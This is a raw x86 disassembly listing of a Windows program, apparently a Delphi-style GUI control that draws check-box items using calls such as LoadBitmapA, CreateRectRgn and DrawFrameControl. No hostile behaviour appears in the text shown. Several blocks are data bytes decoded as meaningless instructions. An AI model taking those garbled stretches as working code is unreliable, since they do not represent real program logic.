mov eax ebx
call sub_441928
call sub_432b54
call sub_432c34
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov [ ebx + 0x270 ] 0x0
mov eax ebx
call sub_474760
sub_47b5c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47b5e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b5f0
retn
sub_47b5fc
dec eax
mov dh 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov bh 0x47
add [ edx - 0x63ffb849 ] dl
add al [ eax ]
add [ eax + 0x48004355 ] cl
out dx al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
inc esp
aas
inc esp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
cmp dl al
inc edi
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al ch
rol [ edi ] 0x38
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add [ eax + 0x20004389 ] cl
pop ds
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax + 0x50 ] al
retn
sub_47b6fc
inc esp
add [ eax + 0x14004441 ] dh
jbe r-xdata
mov esp 0x2b00e
mov bl 0xff
mov dl 0xff
mov al 0xff
mov cl 0xff
mov edx 0xafffd5ff
[ esi - 0x73005201 ]
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x64 ] ax
add [ ebx ] sub_438160
fadd [ ecx + 0x7db80043 ]
inc ebx
add al ah
jle r-xdata
je r-xdata
add ah ch
jle r-xdata
add [ eax + eax * 4 + 0x43 ] bl
add [ eax - 0x4c ] dl
inc esp
add [ eax ] bl
pop [ ebx ]
rol [ ecx - 0x7d37ffbd ] 0x43
add ah ah
retn
inc edi
add [ esp + ecx * 8 - 0x3477ffb9 ] cl
inc edi
add [ eax - 0x27ffb835 ] dl

mov esp cs
inc edi
add [ eax - 0x6fffb835 ] cl

add [ edi + edi * 2 ] dh
inc ebx
sub_47b763
lds eax [ edi ]
je r-xdata
add [ eax + eax * 4 + 0x43 ] bl
add [ eax - 0x4c ] dl
inc esp
add [ eax ] bl
pop [ ebx ]
rol [ ecx - 0x7d37ffbd ] 0x43
add ah ah
retn
inc edi
add [ esp + ecx * 8 - 0x3477ffb9 ] cl
inc edi
add [ eax - 0x27ffb835 ] dl

sub_47c140
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c1b9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4279e4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c1c0
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
add eax 0x3
sub_47c1e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437c84
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_47c238
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x290 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_437d70
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_47c268
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax ebx
call sub_43883c
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax ebx
call sub_47c388
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebx + 0x290 ]
call sub_40d3ac
inc eax
mov [ esp ] eax
xor esi esi
mov edx esi
mov eax ebx
call sub_47cb0c
mov edi eax
mov edx esi
mov eax [ ebx + 0x290 ]
call sub_417e94
mov ebp eax
mov eax ebp
call sub_47c1d8
mov [ edi + 0x8 ] al
mov eax ebp
call sub_47c1dc
mov [ edi + 0x9 ] al
inc esi
dec [ esp ]
jne r-xdata
sub_47c2dc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_43890c
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x290 ] eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov edx esi
mov eax ebx
call sub_47c8f8
xor al 0x1
push eax
mov edx esi
mov eax ebx
call sub_47c924
pop edx
call sub_47c1c4
mov edx eax
mov eax [ ebx + 0x290 ]
call sub_417d38
inc esi
dec edi
jne r-xdata
sub_47c388
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x228 ]
call sub_4228ec
mov edx r-xdata
mov eax [ ebx + 0x228 ]
call sub_422848
mov esi eax
mov [ ebx + 0x284 ] esi
push esi
xor ecx ecx
mov edx 0x1a0
mov eax ebx
call sub_440d98
sub_47c3db
inc [ edx ]
add [ eax ] al
add [ edi + 0x67 ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47c368
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
push edi
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_438cc4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x252 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_47c8f8
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x254 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov [ eax + 0x254 ] edx
xor eax eax
push ebp
push sub_47c56a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_438cc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x254 ] edx
retn
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_47cccc
test al al
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x294 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
call sub_421a0c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x298 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x14 ]
call sub_4221f8
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff000011
call sub_421a0c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
add eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
test bl bl
jne r-xdata
push ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_47c924
mov ecx eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_47c5e8
jmp r-xdata
sub_47c58c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_47cccc
test al al
jne r-xdata
mov edx ebp
mov eax ebx
call sub_438e00
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax ebx
call sub_47c368
sub [ edi + 0x24 ] eax
mov eax ebx
call sub_47c368
add [ edi + 0x1c ] eax
jmp r-xdata
sub_47c5e8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] cl
mov esi eax
xor edi edi
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
add edx eax
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
adc edx 0x0
add edx eax
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
add eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
add eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov ebx [ esi + 0x228 ]
cmp [ esi + 0x281 ] 0x0
je r-xdata
adc edx 0x0
call sub_432b54
call sub_432c34
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateRectRgn
mov edi eax
push edi
mov eax ebx
call sub_4229f0
push eax
call GetClipRgn
mov eax [ ebp - 0x24 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x28 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x2c ]
add eax 0x2
push eax
mov eax [ ebp - 0x30 ]
add eax 0x2
push eax
call CreateRectRgn
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4229f0
push eax
call SelectClipRgn
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x408
mov [ ebp - 0x8 ] 0x400
jmp r-xdata
call sub_432b54
lea ecx [ ebp - 0x3c ]
mov dl 0x12
call sub_432e34
jmp r-xdata
call sub_432b54
lea ecx [ ebp - 0x3c ]
mov dl 0xf
call sub_432e34
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_4229f0
push eax
call DrawFrameControl
or [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax ebx
call sub_4229f0
push eax
call sub_432b54
lea ecx [ ebp - 0x3c ]
pop edx
call sub_432d40
jmp r-xdata
call sub_432b54
lea ecx [ ebp - 0x3c ]
mov dl 0x1a
call sub_432e34
call sub_432b54
lea ecx [ ebp - 0x3c ]
mov dl 0x17
call sub_432e34
jmp r-xdata
call sub_432b54
lea ecx [ ebp - 0x3c ]
mov dl 0x16
call sub_432e34
jmp r-xdata
call sub_432b54
lea ecx [ ebp - 0x3c ]
mov dl 0x13
call sub_432e34
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
mov eax ebx
call sub_4229f0
push eax
call SelectClipRgn
push edi
call DeleteObject
mov eax [ ebx + 0x14 ]
call sub_42230c
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x14 ]
call sub_4221f0
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_421ef0
mov edi eax
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_422314
mov edx 0xff000010
mov eax [ ebx + 0x10 ]
call sub_421ef8
mov eax [ ebp - 0x28 ]
dec eax
push eax
mov eax [ ebp - 0x24 ]
dec eax
push eax
mov ecx [ ebp - 0x2c ]
inc ecx
mov edx [ ebp - 0x30 ]
inc edx
mov eax ebx
call sub_422698
mov dl [ ebp - 0x9 ]
mov eax [ ebx + 0x14 ]
call sub_422314
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4221f8
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_421ef8
cmp [ esi + 0x281 ] 0x0
je r-xdata
sub_47c844
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_47c924
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
call sub_47cb0c
mov [ eax + 0x8 ] bl
mov edx esi
mov eax edi
call sub_47c874
sub_47c874
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cccc
test al al
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebx
call sub_4386c0
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax ebx
call sub_47c368
mov edx [ esp + 0x8 ]
sub edx eax
mov [ esp ] edx
mov eax ebx
call sub_47c368
add eax [ esp ]
mov [ esp + 0x8 ] eax
jmp r-xdata
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_446450
push eax
call InvalidateRect
mov eax ebx
call sub_446450
push eax
call UpdateWindow
sub_47c8f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cbc0
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47cb0c
mov al [ eax + 0x9 ]
xor al 0x1
pop esi
pop ebx
retn
sub_47c924
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cbc0
test al al
je r-xdata
mov eax [ r-xdata ]
call sub_47c1e4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47cb0c
mov al [ eax + 0x8 ]
pop esi
pop ebx
retn
sub_47c954
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi ] 0x20
jne r-xdata
mov edx esi
mov eax ebx
call sub_439034
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_47ca54
sub_47c980
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push edi
push esi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_4411ac
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax edi
call sub_416a38
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax ebx
call sub_438634
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47c8f8
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4386c0
mov esi [ ebp - 0x18 ]
mov eax ebx
call sub_47c368
sub esi eax
sub edi esi
test edi edi
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4386c0
sub edi [ ebp - 0x20 ]
mov eax ebx
call sub_47c368
cmp edi eax
jge r-xdata
mov eax ebx
call sub_47c368
cmp edi eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47ca54
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47ca54
sub_47ca54
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_47c8f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_47c924
mov edx eax
sub dl 0x1
jb r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
je r-xdata
mov al 0x1
jmp r-xdata
mov al 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
dec dl
je r-xdata
mov ecx eax
mov edx esi
mov eax ebx
call sub_47c844
mov eax ebx
mov si 0xffad
call sub_403368
mov al 0x1
jmp r-xdata
sub_47cae4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
mov edx esi
mov eax ebx
call sub_47cbc0
test al al
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47cb0c
mov edi [ eax + 0x4 ]
sub_47cb0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cb2c
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47cb98
sub_47cb2c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437e3c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
xor ebx ebx
sub_47cb98
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_437e5c
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_47cbd8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cbc0
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_47cb0c
mov [ eax + 0x4 ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_47cc04
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_437eb8
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_47cb0c
call sub_40316c
mov edx ebx
mov eax edi
call sub_47cbc0
test al al
je r-xdata
sub_47cc48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cbc0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_437e98
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47cb0c
call sub_40316c
sub_47cc8c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx ebp
mov eax edi
call sub_4456a4
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_47cb2c
call sub_40316c
inc esi
dec ebx
jne r-xdata
sub_47cccc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cbc0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47cb0c
mov al [ eax + 0xa ]
pop esi
pop ebx
retn
sub_47cd1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47cd41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cd48
retn
sub_47cf62
inc ebx
add al al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ ebp + ebx * 8 + 0x47 ] al
add [ eax ] bh
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax - 0x74 ] al
add [ edi ] sub_443554
sbb ah dh
inc edi
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004481 ] al
jbe r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2e80040 ] dl
add [ eax ] al
or eax 0xa5b01900
push [ eax - 0x52003e01 ]
[ edi + edi * 8 - r--data ]
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax + 0x4c ] ax
pop edx
inc edi
add [ eax - 0x27ffb89c ] ah
fiadd [ edi ]
int3
sub_47daa0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bl 0x47
add [ eax + 0x47db ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x380047db ] dl
add [ eax ] al
add [ esi + ebx * 2 + 0x33b40041 ] ah
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ebp + ebx * 4 + 0x41 ] ch
add [ ebp + eax * 4 - 0x6e9bffbf ] cl
inc ecx
add ah dh
hlt
sub_47daf2
inc edi
add [ eax ] dl
inc ecx
add [ eax - 0x60 ] cl
inc ecx
add [ eax + 0x41 ] cl
add [ eax - 0x60 ] dl
inc ecx
add [ edx * 4 - 0x4d7ffbf ] ah
inc edi
add [ eax ] ah
mov [ 0xffffffffa2f40041 ] al
inc ecx
add ah ah
fwait
inc ecx
add [ eax ] dh
mov [ 0xffffffffa3a40041 ] eax
inc ecx
add al cl
popfd
inc ecx
add ah dl
popfd
inc ecx
add [ edi + ecx * 4 - 0x8e7ffbf ] ah
inc edi
add [ eax + edi * 8 - 0x6cfffb9 ] dh
inc edi
add al dl
xchg esp eax
inc ecx
add [ eax - 0x6927ffbf ] ch
inc ecx
add [ edi + edx * 4 - 0x5f17ffbf ] ch
inc ecx
add al bh
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
dec esp
imul esi [ ebx + 0x74 ] 0x69727453
outsb
jae r-xdata
sbb al 0x0
add bh bh
mov al 0xfc
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
mov al [ 0xffffffff98100041 ]
inc ecx
add [ eax + ebx * 4 + 0x41 ] ah
add [ eax ] dl
cdq
inc ecx
add [ eax + 0x419a ] ch
fwait
inc ecx
add [ ebx + ebx * 4 - 0x9a3ffbf ] dl
inc edi
add [ esi + esi * 8 ] ch
inc edi
add [ edx + edi * 8 + 0x47 ] dl
add [ edi + ebx * 4 - 0x5ca3ffbf ] bl
inc ecx
add [ edi + esi * 8 + 0x47 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebx * 8 + 0x47 ] dh
add [ eax ] dh
add [ eax ] al
add [ ecx ] dl
push esp
push esi
popad
insb
jne r-xdata
fild [ edi ]
pop es
dec esp
outsb
je r-xdata
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45090001 ] al
imul esi [ fs : ebx + edx * 2 + 0x74 ] 0x94656c79
adc [ eax ] al
fadd [ edi ]
pop es
or [ ecx + ecx * 2 + 0x74 ] edx
insd
push eax
jb r-xdata
inc edi
add [ esp + edi * 8 ] cl
inc edi
add [ ebp + eax * 4 - 0x7b57ffbf ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
or [ ecx + ecx * 2 + 0x74 ] edx
insd
push eax
jb r-xdata
xor [ eax ] eax
fdiv st3
dec esp
imul esi [ ebx + 0x74 ] 0x69727453
outsb
jae r-xdata
fadd [ edx ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] bl
add [ eax ] al
popad
dec edi
outsb
insb
jns r-xdata
pop esp
pop esi
inc ecx
add al dh
cld
inc edi
add [ edi * 8 + 0x10047 ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or [ eax + 0x69 ] dl
arpl [ ebx + 0x4c ] bp
imul esi [ ebx + 0x74 ] r-xdata
adc al 0x0
add bh bh
add [ eax ] 0x0
add [ eax + 0x4b070002 ] al
jo r-xdata
adc [ esi + edx * 2 + 0x61 ] edx
insb
jne r-xdata
test al 0xdb
inc edi
add [ edi ] al
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add ah bl
sti
fiadd [ edi ]
xchg esp eax
pop edi
inc ecx
add [ eax ] al
add [ edi ] al
push esi
popad
insb
inc ebp
imul esi [ fs : eax + eax ] 0x47dc1c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fadd [ edi ]
push eax
fadd [ edi ]
add [ eax ] al
add [ eax ] al
